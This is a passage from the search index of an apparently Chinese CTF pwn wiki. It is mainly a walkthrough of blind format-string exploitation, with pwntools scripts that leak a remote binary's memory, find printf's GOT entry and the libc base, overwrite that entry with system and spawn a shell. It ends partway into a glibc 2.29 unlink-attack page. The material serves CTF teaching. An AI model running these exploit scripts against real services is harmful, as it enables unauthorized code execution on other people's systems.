\u4f4d\u548c 64 \u4f4d\u5404\u4e0d\u76f8\u540c\uff1a 32 \u4f4d\uff1a\u4ece 0x8048000 \u5f00\u59cb\u6cc4\u9732 64 \u4f4d\uff1a\u4ece 0x400000 \u5f00\u59cb\u6cc4\u9732 \u4e0b\u9762\u662f\u8fd9\u6761\u4f8b\u9898\u7684\u6cc4\u9732\u811a\u672c\uff0c\u7ed3\u5408\u6ce8\u89e3\u5206\u6790\u5982\u4f55\u5904\u7406\u4e0a\u9762\u63d0\u5230\u7684\u95ee\u9898\uff1a #! /usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import binascii r = remote ( '127.0.0.1' , 10001 ) def leak ( addr ): payload = \"%9$s.TMP\" + p32 ( addr ) r . sendline ( payload ) print \"leaking:\" , hex ( addr ) r . recvuntil ( 'right:' ) ret = r . recvuntil ( \".TMP\" , drop = True ) print \"ret:\" , binascii . hexlify ( ret ), len ( ret ) remain = r . recvrepeat ( 0.2 ) return ret # name r . recv () r . sendline ( 'nameaaa' ) r . recv () # leak begin = 0x8048000 text_seg = '' try : while True : ret = leak ( begin ) text_seg += ret begin += len ( ret ) if len ( ret ) == 0 : # nil begin += 1 text_seg += ' \\x00 ' except Exception as e : print e finally : print '[+]' , len ( text_seg ) with open ( 'dump_bin' , 'wb' ) as f : f . write ( text_seg ) \u6ce8\u89e3 \uff1a 19-21 \u884c\uff1a\u5904\u7406\u65e0\u5173\u6cc4\u9732\u7684\u7a0b\u5e8f\u6d41\u7a0b\u540e\uff0c\u8fdb\u5165\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u8f93\u5165\u72b6\u6001 24 \u884c\uff1a32 \u4f4d\u7cfb\u7edf\u52a0\u8f7d\u5730\u5740 9 \u884c\uff1a\"%9$s.TMP\" \u4e2d\u7684 .TMP \u65e2\u662f\u586b\u5145\u5bf9\u9f50\uff0c\u4e5f\u662f\u5206\u9694\u7b26\uff0c\u65b9\u4fbf\u540e\u9762\u5904\u7406\u6570\u636e 14 \u884c\uff1a\u4f7f\u7528binascii \u5c06\u6cc4\u6f0f\u51fa\u6765\u5b57\u7b26\u4e32\u6bcf\u4e00\u4e2a\u90fd\u4ece ascii \u8f6c\u6362\u4e3a \u5341\u516d\u8fdb\u5236\uff0c\u65b9\u4fbf\u663e\u793a 15 \u884c\uff1ar.recvrepeat(0.2) \u63a5\u53d7\u8fd4\u56de\u7684\u5783\u573e\u6570\u636e\uff0c\u65b9\u4fbf\u4e0b\u4e00\u8f6e\u7684\u8f93\u5165 30 \u884c\uff1a\u6cc4\u6f0f\u5730\u5740\u52a8\u6001\u589e\u52a0\uff0c\u5047\u5982\u6cc4\u6f0f 1 \u5b57\u8282\u5c31\u589e\u52a0 1 \uff1b\u6cc4\u6f0f 3 \u5b57\u8282\u5c31\u589e\u52a0 3 31-33 \u884c\uff1a\u5904\u7406\u6cc4\u6f0f\u957f\u5ea6\u4e3a 0 \uff0c\u4e5f\u5c31\u662f\u6570\u636e\u662f \\x00 \u7684\u60c5\u51b5\u3002\u5730\u5740\u589e\u52a0 1 \uff0c\u7a0b\u5e8f\u6570\u636e\u52a0 \\x00 \u8fd0\u884c\u4e4b\u540e\uff0c\u8010\u5fc3\u7b49\u5f85\u6cc4\u6f0f\u5b8c\u6210\u3002\u6cc4\u6f0f\u51fa\u6765\u7684\u7a0b\u5e8f\u662f\u4e0d\u80fd\u8fd0\u884c\u7684\uff0c\u4f46\u53ef\u4ee5\u5728 ida \u8fdb\u8fc7\u5904\u7406\u53ef\u4ee5\u8fdb\u884c\u5206\u6790\u3001\u627e plt \u3001got.plt \u7b49\u3002 \u5c06\u6cc4\u6f0f\u51fa\u6765\u7684\u7a0b\u5e8f\uff0c\u653e\u5165 ida \uff0c\u542f\u52a8\u65f6\u9009\u62e9**\u4ee5 binary file \u52a0\u8f7d**\uff0c\u52fe\u9009 Load as code segment \uff0c\u5e76**\u8c03\u6574\u504f\u79fb\u4e3a\uff1a 0x8048000 **\uff08\u5f00\u59cb\u6cc4\u9732\u7684\u5730\u5740\uff09\uff1a \u53ef\u4ee5\u901a\u8fc7 shift+F12 \u67e5\u5b57\u7b26\u4e32\u5b9a\u4f4d\u5230 main \u51fd\u6570\uff0c\u7136\u540e\u76f4\u63a5 F5 \u53cd\u7f16\u8bd1\uff1a \u57fa\u672c\u7ed3\u6784\u5df2\u7ecf\u51fa\u6765\u4e86\uff0c\u76f2\u6253\u6ca1\u6709\u6e90\u4ee3\u7801\uff0c\u5c31\u9700\u8981\u6839\u636e\u4f20\u5165\u53c2\u6570\u53bb\u5224\u65ad\u54ea\u4e2a sub_xxx \u662f\u54ea\u4e2a\u51fd\u6570\u4e86\u3002\u6bd4\u5982\u8f93\u51fa\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684 sub_8048490 \u5c31\u662f printf \u3002","title":"\u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#text","text":"\u7a0b\u5e8f\u542f\u52a8\u8fc7\u7a0b\uff1a \u4ece _start \u51fd\u6570\u5f00\u59cb\u5c31\u662f .text \u6bb5\uff0c\u53ef\u4ee5\u5728 ida \u4e2d\u6253\u5f00\u4e00\u4e2a\u6b63\u5e38\u7684 binary \u89c2\u5bdf text \u6bb5\u5f00\u5934\u7b2c\u4e00\u4e2a\u51fd\u6570\u5c31\u662f _stat \uff1a\uff08\u56fe\u4e3a 32 \u4f4d\u7a0b\u5e8f\uff09 \u5148\u7528 %p \u6cc4\u9732\u51fa\u6808\u4e0a\u6570\u636e\uff0c\u627e\u5230\u4e24\u4e2a\u76f8\u540c\u5730\u5740\uff0c\u800c\u4e14\u8fd9\u4e2a\u5730\u5740\u5f88\u9760\u8fd1\u7a0b\u5e8f\u52a0\u8f7d\u521d\u5730\u5740\uff0832\u4f4d\uff1a0x8048000\uff1b64\u4f4d\uff1a0x400000\uff09\u3002\u811a\u672c\u5982\u4e0b\uff1a from pwn import * import sys p = remote ( '127.0.0.1' , 10001 ) p . recv () p . sendline ( 'nameaaa' ) p . recv () def where_is_start ( ret_index = null ): return_addr = 0 for i in range ( 400 ): payload = ' %%%d $p.TMP' % ( i ) p . sendline ( payload ) p . recvuntil ( 'right:' ) val = p . recvuntil ( '.TMP' ) log . info ( str ( i * 4 ) + ' ' + val . strip () . ljust ( 10 )) if ( i * 4 == ret_index ): return_addr = int ( val . strip ( '.TMP' ) . ljust ( 10 )[ 2 :], 16 ) return return_addr p . recvrepeat ( 0.2 ) start_addr = where_is_start () \u6700\u540e\u5728\u504f\u79fb 1164 \u548c 1188 \u627e\u5230 text \u6bb5\u5730\u5740 0x8048510 \uff0c\u53ef\u4ee5\u5bf9\u6bd4\u4e0a\u56fe\uff0c\u4e0a\u56fe\u662f\u8fd9\u6761\u4f8b\u9898\u7684\u622a\u56fe\uff1a \u6cc4\u9732\u811a\u672c\u548c\u524d\u9762\u4e00\u6837\u53ea\u9700\u8981\u4fee\u6539\u4e00\u4e0b\u8d77\u59cb\u5730\u5740\uff1a #! /usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import binascii context . log_level = 'info' r = remote ( '127.0.0.1' , 10001 ) def leak ( addr ): payload = \"%9$s.TMP\" + p32 ( addr ) r . sendline ( payload ) print \"leaking:\" , hex ( addr ) r . recvuntil ( 'right:' ) ret = r . recvuntil ( \".TMP\" , drop = True ) print \"ret:\" , binascii . hexlify ( ret ), len ( ret ) remain = r . recvrepeat ( 0.2 ) return ret # name r . recv () r . sendline ( 'nameaaa' ) r . recv () # leak begin = 0x8048510 #begin = 0x8048000 text_seg = '' try : while True : ret = leak ( begin ) text_seg += ret begin += len ( ret ) if len ( ret ) == 0 : # nil begin += 1 text_seg += ' \\x00 ' except Exception as e : print e finally : print '[+]' , len ( text_seg ) with open ( 'dump_bin_text' , 'wb' ) as f : f . write ( text_seg ) \u5c06\u6cc4\u9732\u6587\u4ef6\u653e\u5165 ida \u5206\u6790\uff0c\u542f\u52a8\u65f6\u9009\u62e9**\u4ee5 binary file \u52a0\u8f7d**\uff0c\u52fe\u9009**Load as code segment**\uff0c\u5e76**\u8c03\u6574\u504f\u79fb\u4e3a\uff1a 0x8048510 **\uff08\u5f00\u59cb\u6cc4\u9732\u5730\u5740\uff09\uff1a \u627e\u5230 main \u51fd\u6570\u5728 0x0804860B \uff0c\u9700\u8981\u5c06\u8fd9\u90e8\u5206\u5b9a\u4e49\u4e3a\u51fd\u6570\u624d\u80fd\u53cd\u7f16\u8bd1\uff0c\u53f3\u952e\u5730\u5740\u9694\u58c1\u7684\u540d\u79f0 loc_804860B \uff0ccreat function \u3002 \u7ea2\u8272\u90e8\u5206\u5c31\u662f\u6ca1\u6709\u6cc4\u9732\u51fa\u6765\u7684\u51fd\u6570\uff0c\u540e\u9762\u8ddf\u7684\u5c31\u662f\u51fd\u6570 plt \u5730\u5740\u3002 \u4e24\u79cd\u65b9\u6cd5\u5404\u6709\u4e0d\u540c\uff0c\u7ed3\u5408\u5b9e\u9645\u4f7f\u7528\u3002","title":"\u4ece .text \u6bb5\u5f00\u59cb"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_8","text":"\u7740\u91cd\u8bb0\u5f55**\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253**\uff0c\u4e0d\u4e00\u6b65\u4e00\u6b65\u5206\u6790\u8fd9\u9053\u9898\u76ee\u6f0f\u6d1e\uff08\u8be6\u7ec6\u5206\u6790\uff1a \u9ed8\u5c0f\u897f \u535a\u5ba2\uff09\u3002\u8fd9\u9053\u9898\u76ee\u601d\u8def\u662f\uff1a \u786e\u5b9a printf \u7684 plt \u5730\u5740 \u901a\u8fc7\u6cc4\u9732 plt \u8868\u4e2d\u7684\u6307\u4ee4\u5185\u5bb9\u786e\u5b9a\u5bf9\u5e94\u7684 got.plt \u8868\u5730\u5740 \u901a\u8fc7\u6cc4\u9732\u7684 got.plt \u8868\u5730\u5740\u6cc4\u9732 printf \u51fd\u6570\u7684\u5730\u5740 \u901a\u8fc7\u6cc4\u9732\u7684 printf \u7684\u51fd\u6570\u5730\u5740\u786e\u5b9a libc \u57fa\u5740\uff0c\u4ece\u800c\u83b7\u5f97 system \u5730\u5740 \u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4efb\u610f\u5199\u529f\u80fd\u5c06 printf \u7684 got.plt \u8868\u4e2d\u7684\u5730\u5740\u4fee\u6539\u4e3a system \u7684\u5730\u5740 send \u5b57\u7b26\u4e32 \u201c/bin/sh\u201d \uff0c\u90a3\u4e48\u5728\u8c03\u7528 printf(\u201c/bin/sh\u201d) \u7684\u65f6\u5019\u5b9e\u9645\u4e0a\u8c03\u7528\u7684\u662f system(\u201c/bin/sh;\u201d) \uff0c\u4ece\u800c\u6210\u529f\u83b7\u53d6shell","title":"\u89e3\u9898\u6d41\u7a0b"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#printf-plt","text":"\u5c06\u6cc4\u9732\u51fa\u6765\u7684\u7a0b\u5e8f\uff0c\u653e\u5165 ida \u4e2d\u5206\u6790\u83b7\u5f97\uff0c\u51fd\u6570\u540d\u540e\u534a\u622a\u5c31\u662f\u5730\u5740 0x8048490 \uff1a","title":"\u786e\u5b9a printf \u7684 plt \u5730\u5740"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#gotplt","text":"\u548c\u6cc4\u9732\u7a0b\u5e8f payload \u9ad8\u5ea6\u76f8\u4f3c\uff1a payload = \"%9$sskye\" + p32 ( printf_plt ) p . sendline ( payload ) # \\xff\\x25 junk code p . recvuntil ( 'right: \\xff\\x25 ' ) printf_got_plt = u32 ( p . recv ( 4 )) \u6ce8\u89e3\uff1a \u4e3a\u4ec0\u4e48\u63a5\u6536 'right:\\xff\\x25' \uff1f right: \u662f\u56fa\u5b9a\u56de\u663e\uff0c\\xff\\x25 \u662f\u65e0\u7528\u5b57\u8282\u7801\u3002\u5b9e\u9645\u4e0a 0x8048490 \u7684\u6c47\u7f16\u662f\u8fd9\u6837\u7684\uff1a pwndbg> pdisass 0x8048490 \u25ba 0x8048490 <printf@plt> jmp dword ptr [ 0x804a018 ] <0xf7e4d670> 0x8048496 <printf@plt+6> push 0x18 0x804849b <printf@plt+11> jmp 0x8048450 # \u5b57\u8282\u7801 pwndbg> x /20wx 0x8048490 0x8048490 <printf@plt>: 0xa01825ff 0x18680804 0xe9000000 0xffffffb0 0x8048490 \u6307\u5411\u662f\u4e00\u6761\u8df3\u8f6c got.plt \u6307\u4ee4\uff0c\u6211\u4eec\u9700\u8981\u5176\u4e2d\u8df3\u8f6c\u7684\u76ee\u6807\u5730\u5740\u3002\\xff\\x25 \u5c31\u662f\u8df3\u8f6c\u6307\u4ee4\u7684\u5b57\u8282\u7801\uff0c\u6211\u4eec\u5c31\u8981\u5148\u63a5\u6536 2 \u5b57\u8282\u5783\u573e\u6570\u636e\uff0c\u7136\u540e\u518d\u63a5\u6536 4 \u5b57\u8282\u7684 got.plt \u5730\u5740\u3002","title":"\u6cc4\u9732 got.plt"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#printf","text":"\u6784\u9020\u65b9\u6cd5\u540c\u4e0a\uff0c\u4f46\u4e0d\u9700\u8981\u63a5\u6536 2 \u5b57\u8282\u5783\u573e\u6570\u636e\uff1a payload = \"%9$sskye\" + p32 ( printf_got_plt ) p . sendline ( payload ) p . recvuntil ( 'right:' ) printf_got = u32 ( p . recv ( 4 ))","title":"\u6cc4\u9732 printf \u51fd\u6570\u7684\u5730\u5740"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#libc-system","text":"\u9898\u76ee\u6ca1\u6709\u7ed9\u51fa libc \u3002\u4ece\u6cc4\u9732\u51fa\u6765\u7684 printf@got \u53bb libcdatabase \u67e5\u8be2\u5176\u4ed6\u51fd\u6570\u504f\u79fb\u3002 printf:0x00049670 system:0x0003ada0","title":"\u6cc4\u9732 libc \u57fa\u5740&amp; system \u5730\u5740"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#amp112amp114amp105amp110amp116amp102amp64amp103amp111amp116amp46amp112amp108amp116","text":"payload = fmtstr_payload ( 7 , { printf_got_plt : system_addr }) p . sendline ( payload )","title":"\u4efb\u610f\u5199\u4fee\u6539 \u0002amp\u0003#112;\u0002amp\u0003#114;\u0002amp\u0003#105;\u0002amp\u0003#110;\u0002amp\u0003#116;\u0002amp\u0003#102;\u0002amp\u0003#64;\u0002amp\u0003#103;\u0002amp\u0003#111;\u0002amp\u0003#116;\u0002amp\u0003#46;\u0002amp\u0003#112;\u0002amp\u0003#108;\u0002amp\u0003#116;"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#exp","text":"#!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : leakmemory_remote.py from pwn import * import binascii context . log_level = 'debug' p = remote ( '127.0.0.1' , 10001 ) def leak ( addr ): payload = \"%9$s.TMP\" + p32 ( addr ) p . sendline ( payload ) print \"leaking:\" , hex ( addr ) p . recvuntil ( 'right:' ) resp = p . recvuntil ( \".TMP\" ) ret = resp [: - 4 :] print \"ret:\" , binascii . hexlify ( ret ), len ( ret ) remain = p . recvrepeat ( 0.2 ) return ret printf_plt = 0x8048490 # name p . recv () p . sendline ( 'nameaaa' ) p . recv () # leak printf@got.plt payload = \"%9$sskye\" + p32 ( printf_plt ) p . sendline ( payload ) # \\xff\\x25 junk code p . recvuntil ( 'right: \\xff\\x25 ' ) printf_got_plt = u32 ( p . recv ( 4 )) log . info ( \"printf_got_plt:\" + hex ( printf_got_plt )) # leak printf@got payload = \"%9$sskye\" + p32 ( printf_got_plt ) p . sendline ( payload ) p . recvuntil ( 'right:' ) printf_got = u32 ( p . recv ( 4 )) log . info ( \"printf_got:\" + hex ( printf_got )) # libcdatabase libc_base = printf_got - 0x00049670 log . info ( \"libc_base:\" + hex ( libc_base )) system_addr = libc_base + 0x0003ada0 log . info ( \"system_addr:\" + hex ( system_addr )) # overwrite payload = fmtstr_payload ( 7 , { printf_got_plt : system_addr }) p . sendline ( payload ) p . sendline ( '/bin/sh \\x00 ' ) p . interactive ()","title":"exp"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#64","text":"","title":"64 \u4f4d\u5229\u7528\u624b\u6cd5"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_9","text":"\u8fd8\u662f\u4f7f\u7528 32 \u4f4d\u7684\u4f8b\u9898\u6e90\u7801\uff0c\u7f16\u8bd1 64 \u4f4d\u7a0b\u5e8f\uff1a gcc -z execstack -fno-stack-protector -o leakmemory_64 leakmemory.c \u7528 socat \u6302\u5230\u7aef\u53e3 10001 \u4e0a\u90e8\u7f72\uff1a socat TCP4-LISTEN:10000,fork EXEC:./leakmemory \u5b9e\u9a8c\u73af\u5883\u5b8c\u6210\uff0c\u5982\u679c\u662f\u672c\u5730\u90e8\u7f72\u7684\u8bdd\uff0c\u7b49\u7b49\u5728 exp \u91cc\u9762\u5199 remote(\"127.0.0.1\",10000) \u6a21\u62df\u6ca1\u6709 binary \u7684\u8fdc\u7a0b\u76f2\u6253\u3002","title":"\u5b9e\u9a8c\u73af\u5883\u51c6\u5907"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_10","text":"\u586b\u5145 8 \u5b57\u8282\uff0c\u7136\u540e\u518d\u586b\u5165 %p \uff0c\u56de\u663e\u957f\u5ea6\u662f 8 \u5b57\u8282\u3002","title":"\u786e\u5b9a\u7a0b\u5e8f\u7684\u4f4d\u6570"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_11","text":"\u6700\u540e\u786e\u8ba4\u504f\u79fb\u4e3a 8 \u3002","title":"\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u504f\u79fb"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#dump_1","text":"\u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb\uff0c\u6216\u8005\u4ece text \u6bb5\u5f00\u59cb\u53ef\u4ee5\u7684\u3002\u8fd9\u91cc\u4e0d\u518d\u627e text \u6bb5\u8d77\u59cb\u4f4d\u7f6e\uff0c\u76f4\u63a5\u4ece\u7a0b\u5e8f\u52a0\u8f7d\u5730\u65b9\u5f00\u59cb\u6cc4\u9732\u3002\u4e24\u4e2a\u4f4d\u6570\u7a0b\u5e8f\u811a\u672c\u901a\u7528\u7684\uff0c\u6539\u4e00\u4e0b\u53c2\u6570\u5373\u53ef\u3002 64 \u4f4d\u7a0b\u5e8f\u52a0\u8f7d\u8d77\u59cb\u5730\u5740\u662f\uff1a0x400000 \uff0c\u4e0b\u9762\u662f\u5bf9\u6bd4\u56fe\uff1a \u811a\u672c\u8fd8\u662f\u90a3\u4e2a\u811a\u672c\uff0c\u6539\u4e00\u4e0b\u53c2\u6570\u5373\u53ef\uff1a #! /usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import binascii context . log_level = 'info' #r = remote('127.0.0.1',10001) r = remote ( '127.0.0.1' , 10000 ) def leak ( addr ): payload = \"%9$s.TMP\" + p64 ( addr ) r . sendline ( payload ) print \"leaking:\" , hex ( addr ) r . recvuntil ( 'right:' ) ret = r . recvuntil ( \".TMP\" , drop = True ) print \"ret:\" , binascii . hexlify ( ret ), len ( ret ) remain = r . recvrepeat ( 0.2 ) return ret # name r . recv () r . sendline ( 'moxiaoxi' ) r . recv () # leak begin = 0x400000 #0x8048000 text_seg = '' try : while True : ret = leak ( begin ) text_seg += ret begin += len ( ret ) if len ( ret ) == 0 : # nil begin += 1 text_seg += ' \\x00 ' except Exception as e : print e finally : print '[+]' , len ( text_seg ) with open ( 'dump_bin_64' , 'wb' ) as f : f . write ( text_seg ) ida \u52a0\u8f7d\u53c2\u6570\u5982\u56fe\uff1a \u901a\u8fc7\u5b57\u7b26\u4e32\u5b9a\u4f4d\u5230 main \u51fd\u6570\uff0c\u8fd9\u91cc\u6ca1\u6709\u8bc6\u522b\u4e3a\u51fd\u6570\uff0c\u9700\u8981\u624b\u52a8\u521b\u5efa\u51fd\u6570\u3002\u5728 0x0400826 \u53f3\u952e creat function \uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u53cd\u6c47\u7f16\u4e86\u3002 \u70b9\u8fdb printf@plt \uff0c\u91cc\u9762\u662f\u8df3\u8f6c\u5230 printf@got.plt \u6307\u4ee4\uff0c\u4e5f\u5c31\u662f\u4ece ida \u77e5\u9053\u4e86\uff1a printf_plt = 0x4006B0 printf_got_plt = 0x601030 \u89e3\u9898\u601d\u8def\u4e0e 32 \u4f4d\u4e00\u81f4\uff0c\u5229\u7528\u811a\u672c\uff1a #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : leakmemory_64_remote.py from pwn import * import binascii context . log_level = 'debug' p = remote ( '127.0.0.1' , 10000 ) def leak ( addr ): payload = \"%9$s.TMP\" + p64 ( addr ) p . sendline ( payload ) print \"leaking:\" , hex ( addr ) p . recvuntil ( 'right:' ) resp = p . recvuntil ( \".TMP\" ) ret = resp [: - 4 :] print \"ret:\" , binascii . hexlify ( ret ), len ( ret ) remain = p . recvrepeat ( 0.2 ) return ret printf_plt = 0x4006B0 printf_got_plt = 0x601030 # name p . recv () p . sendline ( 'moxiaoxi' ) p . recv () # leak printf@got payload = \"%9$s.TMP\" + p64 ( printf_got_plt + 1 ) p . sendline ( payload ) p . recvuntil ( 'right:' ) printf_got = u64 ( p . recv ( 5 ) . ljust ( 7 , ' \\x00 ' ) + ' \\x00 ' ) << 8 log . info ( \"printf_got:\" + hex ( printf_got )) # libcdatabase libc_base = printf_got - 0x055800 log . info ( \"libc_base:\" + hex ( libc_base )) system_addr = libc_base + 0x045390 log . info ( \"system_addr:\" + hex ( system_addr )) one = p64 ( system_addr )[: 2 ] two = p64 ( system_addr >> 16 )[: 2 ] payload = \" %9104c %12$hn %54293c %13$hn\" + 'a' * 7 payload += p64 ( printf_got_plt ) + p64 ( printf_got_plt + 2 ) p . sendline ( payload ) p . recv () p . sendline ( '/bin/sh \\x00 ' ) p . interactive ()","title":"dump \u7a0b\u5e8f"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_12","text":"axb_2019_fmt32 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\uff0c\u5ffd\u7565\u63d0\u4f9b\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5c31\u662f\u76f2\u6253\u9898\u76ee axb_2019_fmt64 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\uff0c\u5ffd\u7565\u63d0\u4f9b\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5c31\u662f\u76f2\u6253\u9898\u76ee SuCTF2018 - lock2 \u4e3b\u529e\u65b9\u63d0\u4f9b\u4e86 docker \u955c\u50cf: suctf/2018-pwn-lock2","title":"\u66f4\u591a\u5b9e\u4f8b"},{"location":"Pwn/fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/#_13","text":"ctf-wiki leak me pwn-\u76f2\u6253","title":"\u53c2\u8003"},{"location":"Pwn/glibc-heap/Libc2.29%E7%B1%BBunlink_attack/","text":"Libc2.29 unlink Attack \u00b6 unsortbin \u53d8\u5316 \u00b6 libc2.23 \u6ca1\u6709\u5bf9 unsortedbin \u8fdb\u884c\u5b8c\u6574\u6027\u68c0\u67e5\uff1a for (;; ) { int iters = 0 ; while (( victim = unsorted_chunks ( av ) -> bk ) != unsorted_chunks ( av )) { bck = victim -> bk ; if ( __builtin_expect ( victim -> size <= 2 * SIZE_SZ , 0 ) || __builtin_expect ( victim -> size > av -> system_mem , 0 )) malloc_printerr ( check_action , \"malloc(): memory corruption\" , chunk2mem ( victim ), av ); size = chunksize ( victim ); libc2.29 \u589e\u52a0\u4e86\u5b8c\u6574\u6027\u68c0\u67e5\uff1a /* \u5f00\u59cb\u904d\u5386\u6574\u7406unsorted bin\u5c06\u5806\u5757\u653e\u5165\u5bf9\u5e94\u5404\u79cdbin\u4e2d*/ for (;; ) { int iters = 0 ; while (( victim = unsorted_chunks ( av ) -> bk ) != unsorted_chunks ( av )) { /* \u63d0\u53d6\u5012\u6570\u7b2c\u4e8c\u4e2achunk */ bck = victim -> bk ; size = chunksize ( victim ); mchunkptr next = chunk_at_offset ( victim , size ); /* libc2.29\u65b0\u589e\u5b8c\u6574\u6027\u68c0\u67e5 */ if ( __glibc_unlikely ( size <= 2 * SIZE_SZ ) || __glibc_unlikely ( size > av -> system_mem )) malloc_printerr ( \"malloc(): invalid size (unsorted)\" ); if ( __glibc_unlikely ( chunksize_nomask ( next ) < 2 * SIZE_SZ ) || __glibc_unlikely ( chunksize_nomask ( next ) > av -> system_mem )) malloc_printerr ( \"malloc(): invalid next size (unsorted)\" ); if ( __glibc_unlikely (( prev_size ( next ) & ~ ( SIZE_BITS )) != size )) malloc_printerr ( \"malloc(): mismatching next->prev_size (unsorted)\" ); if ( __glibc_unlikely ( bck -> fd != victim ) || __glibc_unlikely ( victim -> fd != unsorted_chunks ( av ))) malloc_printerr ( \"malloc(): unsorted double linked list corrupted\" ); if ( __glibc_unlikely ( prev_inuse ( next ))) malloc_printerr ( \"malloc(): invalid next->prev_inuse (unsorted)\" ); \u539f\u7406 \u00b6 \u5f53 malloc\u3001calloc \u4e4b\u7c7b\u7684\u4ece smallbin \u4e2d\u53d6\u5806\u5757\u65f6\uff0c\u53d6\u51fa\u6210\u529f\u540e\uff0c\u5982\u679c tcache \u6ca1\u6709\u6ee1\u5c31\u4f1a\u5c06 smallbin \u5269\u4e0b\u7684\u5806\u5757\u653e\u5165 tcache \u4e2d\uff0c\uff1a /* malloc\u4ecesmall bin\u53d6\u7a7a\u95f4 */ if ( in_smallbin_range ( nb )) { idx = smallbin_index ( nb ); bin = bin_at ( av , idx ); /* \u5bf9\u5e94\u5927\u5c0fsmall bin\u4e0d\u4e3a\u7a7a\u65f6 */ if (( victim = last ( bin )) != bin ) { /* \u63d0\u524d\u540e\u4e00\u4e2achunk */ bck = victim -> bk ; /* \u68c0\u67e5\u540e\u4e00\u4e2achunk fd\u6307\u9488\u662f\u5426\u6307\u5411\u5f53\u524dchunk\uff0c\u9632\u6b62\u4f2a\u9020 */ if ( __glibc_unlikely ( bck -> fd != victim )) malloc_printerr ( \"malloc(): smallbin double linked list corrupted\" ); /* \u8bbe\u7f6einuse\u4f4d */ set_inuse_bit_at_offset ( victim , nb ); /* unlink\u53d6\u51favictim */ bin -> bk = bck ; bck -> fd = bin ; if ( av != & main_arena ) set_non_main_arena ( victim ); check_malloced_chunk ( av , victim , nb ); #if USE_TCACHE /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ /* \u5f53\u524dsize smallbin\u8fd8\u6709\u5806\u5757\u65f6\uff0c\u5c06\u5269\u4e0bsmallbin\u653e\u5165\u5bf9\u5e94\u5927\u5c0ftcache\u3002\u524d\u63d0\u662ftcache\u6709\u7a7a\u4f59\u4f4d\u7f6e */ /* \u83b7\u53d6size\u5bf9\u5e94\u7684tcache\u5e8f\u53f7 */ size_t tc_idx = csize2tidx ( nb ); if ( tcache && tc_idx < mp_ . tcache_bins ) { mchunkptr tc_victim ; /* While bin not empty and tcache not full, copy chunks over. */ /* \u68c0\u67e5tcache\u6709\u6ca1\u6709\u6ee1\u548csmallbin\u6709\u6ca1\u6709\u5269\u4f59\u5806\u5757 */ while ( tcache -> counts [ tc_idx ] < mp_ . tcache_count && ( tc_victim = last ( bin )) != bin ) { if ( tc_victim != 0 ) { /* 